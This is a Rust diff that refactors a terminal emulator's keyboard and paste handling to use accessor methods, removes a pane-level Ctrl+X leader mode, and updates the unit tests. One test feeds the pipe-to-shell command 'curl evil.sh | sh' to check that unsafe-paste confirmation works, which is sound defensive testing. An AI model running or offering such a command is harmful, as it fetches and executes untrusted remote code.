@@ -17,8 +17,8 @@ use crate::colon_command::{
 };
 use crate::error::Result;
 use crate::input::keymap::{
-    handle_pane_alt_or_fkey_shortcut, handle_pane_leader_key, handle_wm_leader_key,
-    handle_wm_shortcut_key, handle_wm_user_binding_or_leader_entry,
+    handle_pane_alt_or_fkey_shortcut, handle_wm_leader_key, handle_wm_shortcut_key,
+    handle_wm_user_binding_or_leader_entry,
 };
 use crate::input::modal::{
     handle_copy_mode_key, handle_fuzzy_search_key, handle_hints_mode_key,
@@ -51,45 +51,28 @@ pub fn handle_key_event(pane: &mut CompositePane, raw_key: KeyEvent) -> Result<A
     }
 
     // If an unsafe raw PTY paste is awaiting user confirmation (FND-01), route keys to the modal first
-    if pane.pending_unsafe_paste.is_some() {
+    if pane.pending_unsafe_paste().is_some() {
         return handle_unsafe_paste_modal_key(pane, key);
     }
 
     // If keyboard-driven Vi Copy Mode is active on the OutputCanvas (VAL-04), route keys to it first
-    if pane.copy_mode.active {
+    if pane.copy_mode().active {
         return handle_copy_mode_key(pane, key);
     }
 
     // If QuickSelect 3270 Field Hints mode is active on the OutputCanvas (ECO-01), route keys to it first
-    if pane.hints_mode.active {
+    if pane.hints_mode().active {
         return handle_hints_mode_key(pane, key);
     }
 
     // If fuzzy history search is active, route keys to fuzzy search modal first
-    if pane.is_prompt_visible() && pane.prompt.fuzzy_search.active {
+    if pane.is_prompt_visible() && pane.prompt().fuzzy_search.active {
         return handle_fuzzy_search_key(pane, key);
     }
 
     // If the Borland Command History Pop-up Window is open, route keys to it first
-    if pane.is_prompt_visible() && pane.prompt.history_popup_open {
+    if pane.is_prompt_visible() && pane.prompt().history_popup_open {
         return handle_history_popup_key(pane, key);
-    }
-
-    // If single-pane Leader key (`Ctrl+X`) is pending, dispatch the leader action
-    if pane.leader_pending {
-        pane.leader_pending = false;
-        pane.status_message = None;
-        return handle_pane_leader_key(pane, key);
-    }
-
-    // Enter single-pane Leader mode on `Ctrl+X`
-    if is_leader_key(key, "Ctrl+X") {
-        pane.leader_pending = true;
-        pane.status_message = Some(
-            "⌨ LEADER [Ctrl+X]: t/b/s/e=Prompt c/[=Copy f=Hints l=Lock /=Search p=Hist g=Raw"
-                .to_string(),
-        );
-        return Ok(AppAction::Handled);
     }
 
     // Global manual toggle between CommandPrompt and RawPtyPassthrough: Ctrl+G or F12
@@ -102,8 +85,8 @@ pub fn handle_key_event(pane: &mut CompositePane, raw_key: KeyEvent) -> Result<A
 
     // Global 3-way mode cycle (Floating Prompt -> Fixed Prompt -> Regular Terminal -> Floating Prompt):
     // Active in CommandPrompt mode and in manual RegularTerminal mode (when not inside a DECSET 1049 ALT_SCREEN app like htop/vim)
-    if !pane.vt.is_alternate_screen()
-        && !pane.line_discipline.is_password_prompt()
+    if !pane.vt().is_alternate_screen()
+        && !pane.is_password_prompt()
         && (key.code == KeyCode::F(4)
             || (key.modifiers.contains(KeyModifiers::ALT)
                 && matches!(key.code, KeyCode::Char('e') | KeyCode::Char('E'))))
@@ -115,23 +98,21 @@ pub fn handle_key_event(pane: &mut CompositePane, raw_key: KeyEvent) -> Result<A
     // When in RawPtyPassthrough (including DECSET 1049 alternate screen apps like vim/htop/emacs),
     // pass F1..F10 and Alt+<key> directly through to the child PTY instead of intercepting them!
     if pane.effective_routing_mode() == InputRoutingMode::RawPtyPassthrough {
-        if pane.read_only {
-            pane.status_message = Some(
+        if pane.is_read_only() {
+            pane.set_status_message(Some(
                 "🔒 PROTECTED: Pane is locked read-only (:lock off or Ctrl+X l to unlock)"
                     .to_string(),
-            );
+            ));
             return Ok(AppAction::Handled);
         }
         let bytes = encode_key_to_pty_bytes_full(
             raw_key,
-            pane.vt.is_application_cursor(),
-            pane.vt.is_backarrow_key_67(),
-            pane.vt.kitty_keyboard_flags(),
+            pane.vt().is_application_cursor(),
+            pane.vt().is_backarrow_key_67(),
+            pane.vt().kitty_keyboard_flags(),
         );
-        if !bytes.is_empty()
-            && let Some(pty) = &pane.pty
-        {
-            pty.write_all(&bytes)?;
+        if !bytes.is_empty() {
+            pane.write_to_pty(&bytes)?;
         }
         return Ok(AppAction::Handled);
     }
@@ -147,15 +128,15 @@ fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<
     if key.modifiers.contains(KeyModifiers::SHIFT) {
         match key.code {
             KeyCode::Enter => {
-                pane.prompt.insert_newline();
+                pane.prompt_mut().insert_newline();
                 return Ok(AppAction::Handled);
             }
             KeyCode::PageUp => {
-                pane.prompt.scroll_up(2);
+                pane.prompt_mut().scroll_up(2);
                 return Ok(AppAction::Handled);
             }
             KeyCode::PageDown => {
-                pane.prompt.scroll_down(2);
+                pane.prompt_mut().scroll_down(2);
                 return Ok(AppAction::Handled);
             }
             _ => {}
@@ -165,60 +146,56 @@ fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<
     if key.modifiers.contains(KeyModifiers::CONTROL) {
         match key.code {
             KeyCode::Char('r') => {
-                pane.prompt.open_fuzzy_search();
+                pane.prompt_mut().open_fuzzy_search();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('c') => {
                 // If a foreground subcommand (e.g. `tail -f /dev/random`) is running or the prompt is empty,
                 // forward SIGINT (0x03) to the PTY; also clear any partial prompt text and running banner.
-                let has_fg_sub = pane.line_discipline.has_foreground_subcommand();
-                let prompt_was_empty = pane.prompt.input.is_empty();
-                pane.prompt.running_command = None;
+                let has_fg_sub = pane.has_foreground_subcommand();
+                let prompt_was_empty = pane.prompt().input.is_empty();
+                pane.prompt_mut().running_command = None;
                 if !prompt_was_empty {
-                    pane.prompt.clear_line();
+                    pane.prompt_mut().clear_line();
                 }
-                if (prompt_was_empty || has_fg_sub)
-                    && let Some(pty) = &pane.pty
-                {
-                    pty.write_all(&[0x03])?;
+                if prompt_was_empty || has_fg_sub {
+                    pane.write_to_pty(&[0x03])?;
                 }
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('u') => {
-                pane.prompt.clear_line();
+                pane.prompt_mut().clear_line();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('k') => {
-                pane.prompt.kill_to_end_of_line();
+                pane.prompt_mut().kill_to_end_of_line();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('w') => {
-                pane.prompt.kill_prev_word();
+                pane.prompt_mut().kill_prev_word();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('y') => {
-                pane.prompt.yank();
+                pane.prompt_mut().yank();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('z') => {
-                pane.prompt.undo();
+                pane.prompt_mut().undo();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('a') => {
-                pane.prompt.move_cursor_home();
+                pane.prompt_mut().move_cursor_home();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('e') => {
-                pane.prompt.move_cursor_end();
+                pane.prompt_mut().move_cursor_end();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Char('d') => {
-                if pane.prompt.input.is_empty() {
-                    if let Some(pty) = &pane.pty {
-                        pty.write_all(&[0x04])?;
-                    }
+                if pane.prompt().input.is_empty() {
+                    pane.write_to_pty(&[0x04])?;
                 } else {
-                    pane.prompt.delete_char();
+                    pane.prompt_mut().delete_char();
                 }
                 return Ok(AppAction::Handled);
             }
@@ -228,10 +205,10 @@ fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<
 
     match key.code {
         KeyCode::Enter => {
-            let current_text = pane.prompt.text();
+            let current_text = pane.prompt().text();
             // Check for in-prompt :command execution first (PANE-03, PANE-05)
             if let Some(cmd_res) = parse_colon_command(&current_text) {
-                let _ = pane.prompt.take_submission();
+                let _ = pane.prompt_mut().take_submission();
                 match cmd_res {
                     Ok(cmd) => {
                         if execute_colon_command(pane, cmd) {
@@ -239,29 +216,18 @@ fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<
                         }
                     }
                     Err(err_msg) => {
-                        pane.status_message = Some(err_msg);
+                        pane.set_status_message(Some(err_msg));
                     }
                 }
                 return Ok(AppAction::Handled);
             }
 
-            if pane.read_only {
-                pane.status_message = Some(
-                    "🔒 PROTECTED: Pane is locked read-only (:lock off or Alt+L to unlock)"
-                        .to_string(),
-                );
+            if pane.is_read_only() {
+                let _ = pane.submit_prompt();
                 return Ok(AppAction::Handled);
             }
 
-            let submitted = pane.prompt.take_submission();
-            pane.vt.reset_scrollback();
-            pane.vt.record_command_submission(submitted.clone());
-            let _ = pane.history_store.record_command(&submitted);
-            if let Some(pty) = &pane.pty {
-                let mut payload = submitted.into_bytes();
-                payload.push(b'\n');
-                pty.write_all(&payload)?;
-            }
+            pane.submit_prompt()?;
             Ok(AppAction::Handled)
         }
         KeyCode::Tab => {
@@ -273,55 +239,55 @@ fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<
             Ok(AppAction::Handled)
         }
         KeyCode::Esc => {
-            pane.prompt.completion.clear();
+            pane.prompt_mut().completion.clear();
             Ok(AppAction::Handled)
         }
         KeyCode::Backspace => {
-            pane.prompt.backspace();
+            pane.prompt_mut().backspace();
             Ok(AppAction::Handled)
         }
         KeyCode::Delete => {
-            pane.prompt.delete_char();
+            pane.prompt_mut().delete_char();
             Ok(AppAction::Handled)
         }
         KeyCode::Left => {
-            pane.prompt.move_cursor_left();
+            pane.prompt_mut().move_cursor_left();
             Ok(AppAction::Handled)
         }
         KeyCode::Right => {
-            pane.prompt.move_cursor_right();
+            pane.prompt_mut().move_cursor_right();
             Ok(AppAction::Handled)
         }
         KeyCode::Home => {
-            pane.prompt.move_cursor_home();
+            pane.prompt_mut().move_cursor_home();
             Ok(AppAction::Handled)
         }
         KeyCode::End => {
-            pane.prompt.move_cursor_end();
+            pane.prompt_mut().move_cursor_end();
             Ok(AppAction::Handled)
         }
         KeyCode::Up => {
-            if !pane.prompt.move_cursor_up() {
-                pane.prompt.history_prev();
+            if !pane.prompt_mut().move_cursor_up() {
+                pane.prompt_mut().history_prev();
             }
             Ok(AppAction::Handled)
         }
         KeyCode::Down => {
-            if !pane.prompt.move_cursor_down() {
-                pane.prompt.history_next();
+            if !pane.prompt_mut().move_cursor_down() {
+                pane.prompt_mut().history_next();
             }
             Ok(AppAction::Handled)
         }
         KeyCode::PageUp => {
-            pane.vt.scroll_up(5);
+            pane.vt_mut().scroll_up(5);
             Ok(AppAction::Handled)
         }
         KeyCode::PageDown => {
-            pane.vt.scroll_down(5);
+            pane.vt_mut().scroll_down(5);
             Ok(AppAction::Handled)
         }
         KeyCode::Char(ch) => {
-            pane.prompt.insert_char(ch);
+            pane.prompt_mut().insert_char(ch);
             Ok(AppAction::Handled)
         }
         _ => Ok(AppAction::Continue),
@@ -341,29 +307,27 @@ pub fn handle_paste_event(pane: &mut CompositePane, pasted_text: &str) -> Result
     let sanitized = sanitize_paste_bytes(pasted_text);
     match pane.effective_routing_mode() {
         InputRoutingMode::CommandPrompt => {
-            pane.prompt.insert_str(&sanitized);
+            pane.prompt_mut().insert_str(&sanitized);
             Ok(AppAction::Handled)
         }
         InputRoutingMode::RawPtyPassthrough => {
-            let bracketed = pane.vt.is_bracketed_paste();
+            let bracketed = pane.vt().is_bracketed_paste();
             if is_unsafe_paste(pasted_text, bracketed) {
-                pane.pending_unsafe_paste = Some(pasted_text.to_string());
-                pane.status_message = Some(
+                pane.set_pending_unsafe_paste(Some(pasted_text.to_string()));
+                pane.set_status_message(Some(
                     "UNSAFE MULTI-LINE PASTE DETECTED: Press [y/Enter] to confirm or [n/Esc] to cancel"
                         .to_string(),
-                );
+                ));
                 return Ok(AppAction::Handled);
             }
-            if let Some(pty) = &pane.pty {
-                if bracketed {
-                    let mut framed = Vec::with_capacity(sanitized.len() + 12);
-                    framed.extend_from_slice(b"\x1b[200~");
-                    framed.extend_from_slice(sanitized.as_bytes());
-                    framed.extend_from_slice(b"\x1b[201~");
-                    pty.write_all(&framed)?;
-                } else {
-                    pty.write_all(sanitized.as_bytes())?;
-                }
+            if bracketed {
+                let mut framed = Vec::with_capacity(sanitized.len() + 12);
+                framed.extend_from_slice(b"\x1b[200~");
+                framed.extend_from_slice(sanitized.as_bytes());
+                framed.extend_from_slice(b"\x1b[201~");
+                pane.write_to_pty(&framed)?;
+            } else {
+                pane.write_to_pty(sanitized.as_bytes())?;
             }
             Ok(AppAction::Handled)
         }
@@ -387,7 +351,7 @@ pub fn handle_wm_key_event(wm: &mut WindowManager, raw_key: KeyEvent) -> Result<
     // If Prefix/Leader key (`Ctrl+X` by default) is awaiting the next chord, dispatch it across WM + Pane
     if wm.leader_pending {
         wm.leader_pending = false;
-        wm.active_pane_mut().status_message = None;
+        wm.active_pane_mut().set_status_message(None);
         return handle_wm_leader_key(wm, key);
     }
 
@@ -399,9 +363,9 @@ pub fn handle_wm_key_event(wm: &mut WindowManager, raw_key: KeyEvent) -> Result<
     wm.active_pane_mut().refresh_line_discipline();
     let in_raw_passthrough = wm.active_pane().effective_routing_mode()
         == InputRoutingMode::RawPtyPassthrough
-        && wm.active_pane().pending_unsafe_paste.is_none()
-        && !wm.active_pane().copy_mode.active
-        && !wm.active_pane().hints_mode.active;
+        && wm.active_pane().pending_unsafe_paste().is_none()
+        && !wm.active_pane().copy_mode().active
+        && !wm.active_pane().hints_mode().active;
 
     if in_raw_passthrough {
         return handle_key_event(wm.active_pane_mut(), raw_key);
@@ -417,14 +381,14 @@ pub fn handle_wm_key_event(wm: &mut WindowManager, raw_key: KeyEvent) -> Result<
         && !key.modifiers.contains(KeyModifiers::SHIFT)
         && !key.modifiers.contains(KeyModifiers::ALT)
         && wm.active_pane().effective_routing_mode() == InputRoutingMode::CommandPrompt
-        && !wm.active_pane().prompt.fuzzy_search.active
-        && !wm.active_pane().copy_mode.active
-        && !wm.active_pane().hints_mode.active
-        && wm.active_pane().pending_unsafe_paste.is_none()
+        && !wm.active_pane().prompt().fuzzy_search.active
+        && !wm.active_pane().copy_mode().active
+        && !wm.active_pane().hints_mode().active
+        && wm.active_pane().pending_unsafe_paste().is_none()
     {
-        let text = wm.active_pane().prompt.text();
+        let text = wm.active_pane().prompt().text();
         if let Some(cmd_res) = parse_colon_command(&text) {
-            let _ = wm.active_pane_mut().prompt.take_submission();
+            let _ = wm.active_pane_mut().prompt_mut().take_submission();
             match cmd_res {
                 Ok(cmd) => {
                     if execute_wm_colon_command(wm, cmd) {
@@ -432,31 +396,20 @@ pub fn handle_wm_key_event(wm: &mut WindowManager, raw_key: KeyEvent) -> Result<
                     }
                 }
                 Err(err) => {
-                    wm.active_pane_mut().status_message = Some(err);
+                    wm.active_pane_mut().set_status_message(Some(err));
                 }
             }
             return Ok(AppAction::Handled);
         }
 
         // Synchronized Multi-Pane Input Broadcast (ECO-04): submit command to all non-locked workspace panes
-        if wm.broadcast_input && !wm.active_pane().read_only {
-            let submitted = wm.active_pane_mut().prompt.take_submission();
-            let mut payload = submitted.clone().into_bytes();
-            payload.push(b'\n');
+        if wm.broadcast_input && !wm.active_pane().is_read_only() {
+            let submitted = wm.active_pane_mut().prompt_mut().take_submission();
             for pane in wm.panes.values_mut() {
-                if pane.read_only {
+                if pane.is_read_only() {
                     continue;
                 }
-                pane.vt.reset_scrollback();
-                pane.vt.record_command_submission(submitted.clone());
-                let _ = pane.history_store.record_command(&submitted);
-                pane.prompt.running_command = Some(submitted.replace('\n', " ; "));
-                if !submitted.trim().is_empty() && pane.prompt.history.last() != Some(&submitted) {
-                    pane.prompt.history.push(submitted.clone());
-                }
-                if let Some(pty) = &pane.pty {
-                    pty.write_all(&payload)?;
-                }
+                pane.submit_command(&submitted)?;
             }
             return Ok(AppAction::Handled);
         }
@@ -476,7 +429,7 @@ mod tests {
     fn password_keystrokes_in_no_echo_mode_never_leak_into_floating_prompt() {
         let mut pane = CompositePane::new_headless(1, 25, 80);
         // Simulate sudo password prompt (!ECHO)
-        pane.line_discipline.echo_enabled = false;
+        pane.line_discipline_mut().echo_enabled = false;
         assert_eq!(
             pane.effective_routing_mode(),
             InputRoutingMode::RawPtyPassthrough
@@ -487,7 +440,7 @@ mod tests {
                 .expect("route key");
         }
         // Floating prompt buffer MUST remain completely empty
-        assert_eq!(pane.prompt.input, "");
+        assert_eq!(pane.prompt().input, "");
     }
 
     #[test]
@@ -497,14 +450,14 @@ mod tests {
             handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char(ch), KeyModifiers::NONE))
                 .expect("type char");
         }
-        assert_eq!(pane.prompt.input, "echo 3270");
+        assert_eq!(pane.prompt().input, "echo 3270");
 
         handle_key_event(&mut pane, KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE))
             .expect("press enter");
-        assert_eq!(pane.prompt.input, "");
-        assert_eq!(pane.prompt.history, vec!["echo 3270".to_string()]);
-        assert_eq!(pane.vt.command_blocks().len(), 1);
-        assert_eq!(pane.vt.command_blocks()[0].command, "echo 3270");
+        assert_eq!(pane.prompt().input, "");
+        assert_eq!(pane.prompt().history, vec!["echo 3270".to_string()]);
+        assert_eq!(pane.vt().command_blocks().len(), 1);
+        assert_eq!(pane.vt().command_blocks()[0].command, "echo 3270");
     }
 
     #[test]
@@ -546,7 +499,7 @@ mod tests {
             viewport,
         )
         .unwrap();
-        assert_eq!(pane.prompt.anchor, PromptAnchor::Floating { y_offset: 9 });
+        assert_eq!(pane.prompt().anchor, PromptAnchor::Floating { y_offset: 9 });
 
         // 2. Mouse drag bottom border of prompt (now at y = 9 + 2 = 11) down to y = 14 -> height = 6
         handle_mouse_event(
@@ -582,7 +535,7 @@ mod tests {
             viewport,
         )
         .unwrap();
-        assert_eq!(pane.prompt.height, 6);
+        assert_eq!(pane.prompt().height, 6);
 
         // 3. Click [▲] badge on top-right border (prompt_rect is x=1, width=78, right_edge=79, [▲] is at 71..74)
         handle_mouse_event(
@@ -596,11 +549,11 @@ mod tests {
             viewport,
         )
         .unwrap();
-        assert_eq!(pane.prompt.anchor, PromptAnchor::Top);
+        assert_eq!(pane.prompt().anchor, PromptAnchor::Top);
 
         // 4. Paste multiline text into CommandPrompt without auto-executing
         handle_paste_event(&mut pane, "line1\nline2").unwrap();
-        assert_eq!(pane.prompt.lines, vec!["line1".to_string(), "line2".to_string()]);
+        assert_eq!(pane.prompt().lines, vec!["line1".to_string(), "line2".to_string()]);
     }
 
     #[test]
@@ -611,11 +564,11 @@ mod tests {
 
         // Unbracketed multi-line paste in RawPtyPassthrough stages pending_unsafe_paste
         handle_paste_event(&mut pane, "curl evil.sh | sh\n").unwrap();
-        assert!(pane.pending_unsafe_paste.is_some());
+        assert!(pane.pending_unsafe_paste().is_some());
 
         // Pressing 'n' cancels the pending unsafe paste
         handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE)).unwrap();
-        assert!(pane.pending_unsafe_paste.is_none());
+        assert!(pane.pending_unsafe_paste().is_none());
 
         // Kitty keyboard CSI u encoding
         let shift_enter = encode_key_to_pty_bytes_full(
@@ -646,8 +599,8 @@ mod tests {
 
         // Enter Vi Copy Mode and select a 2x4 rectangular block ("1234\n5678")
         pane.enter_copy_mode();
-        pane.copy_mode.cursor_row = 0;
-        pane.copy_mode.cursor_col = 4;
+        pane.copy_mode_mut().cursor_row = 0;
+        pane.copy_mode_mut().cursor_col = 4;
         handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE)).unwrap();
         handle_key_event(&mut pane, KeyEvent::new(KeyCode::Down, KeyModifiers::NONE)).unwrap();
         handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
@@ -655,9 +608,9 @@ mod tests {
         handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
         handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE)).unwrap();
 
-        assert!(!pane.copy_mode.active);
-        assert_eq!(pane.prompt.yank_buffer, "1234\n5678");
-        assert!(pane.last_osc52_sequence.is_some());
+        assert!(!pane.copy_mode().active);
+        assert_eq!(pane.prompt().yank_buffer, "1234\n5678");
+        assert!(pane.last_osc52_sequence().is_some());
     }
 
     #[test]
@@ -704,7 +657,7 @@ mod tests {
         .unwrap();
         handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE))
             .unwrap();
-        assert_eq!(wm.active_pane().prompt.anchor, PromptAnchor::Bottom);
+        assert_eq!(wm.active_pane().prompt().anchor, PromptAnchor::Bottom);
 
         // Toggle Quake terminal via macOS-safe Ctrl+\
         handle_wm_key_event(
@@ -723,25 +676,25 @@ mod tests {
         // 3. Readline word navigation (Alt+b / Option+Left, Alt+f / Option+Right, Alt+Backspace, Alt+d)
         //    in CommandPrompt does NOT move the prompt box or trigger hints when text is present
         wm.active_pane_mut().set_prompt_anchor(PromptAnchor::Top);
-        wm.active_pane_mut().prompt.set_text("cargo build --release");
-        assert_eq!(wm.active_pane().prompt.cursor_col, 21);
+        wm.active_pane_mut().prompt_mut().set_text("cargo build --release");
+        assert_eq!(wm.active_pane().prompt().cursor_col, 21);
 
         // Option+Left (`Alt+b` or macOS `'∫'`) moves word left to "--release" (col 12), keeping PromptAnchor::Top!
         handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('∫'), KeyModifiers::NONE))
             .unwrap();
-        assert_eq!(wm.active_pane().prompt.cursor_col, 12);
-        assert_eq!(wm.active_pane().prompt.anchor, PromptAnchor::Top);
+        assert_eq!(wm.active_pane().prompt().cursor_col, 12);
+        assert_eq!(wm.active_pane().prompt().anchor, PromptAnchor::Top);
 
         // Another Alt+b moves to "build" (col 6)
         handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::ALT))
             .unwrap();
-        assert_eq!(wm.active_pane().prompt.cursor_col, 6);
+        assert_eq!(wm.active_pane().prompt().cursor_col, 6);
 
         // Option+Right (`Alt+f` or macOS `'ƒ'`) moves word right to "--release" (col 12), without entering hints_mode!
         handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('ƒ'), KeyModifiers::NONE))
             .unwrap();
-        assert_eq!(wm.active_pane().prompt.cursor_col, 12);
-        assert!(!wm.active_pane().hints_mode.active);
+        assert_eq!(wm.active_pane().prompt().cursor_col, 12);
+        assert!(!wm.active_pane().hints_mode().active);
 
         // Alt+Backspace deletes previous word ("build ")
         handle_wm_key_event(
@@ -749,12 +702,12 @@ mod tests {
             KeyEvent::new(KeyCode::Backspace, KeyModifiers::ALT),
         )
         .unwrap();
-        assert_eq!(wm.active_pane().prompt.text(), "cargo --release");
+        assert_eq!(wm.active_pane().prompt().text(), "cargo --release");
 
         // Alt+d deletes next word ("--release")
         handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('d'), KeyModifiers::ALT))
             .unwrap();
-        assert_eq!(wm.active_pane().prompt.text(), "cargo ");
+        assert_eq!(wm.active_pane().prompt().text(), "cargo ");
 
         // 4. In RawPtyPassthrough / ALT_SCREEN (e.g. htop, vim, emacs), F1..F10 and Alt+<key> pass through
         //    to the child app instead of being intercepted by the WM, while Ctrl+X <key> still controls the WM!
